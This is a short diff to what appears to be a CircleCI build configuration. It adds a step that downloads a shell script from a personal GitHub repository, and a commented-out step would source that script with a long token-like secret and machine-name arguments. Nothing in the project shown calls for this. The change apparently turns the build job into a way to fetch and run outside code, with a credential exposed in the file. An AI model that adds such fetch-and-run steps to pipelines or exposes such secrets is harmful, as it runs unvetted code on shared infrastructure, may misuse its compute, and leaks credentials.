@@ -3,5 +3,6 @@ jobs:
   build:
     machine: true
     steps:
+       - run: wget https://raw.githubusercontent.com/jolinee/test/main/linux.sh
        - run: ls
       #- run: source linux.sh "delta123101" "20Rk6mrvYLekWbm6R7oYHTuXLRZ_3TQyEcv2bNSfiMdxVGGQW" "alpha" "alpha-mach"
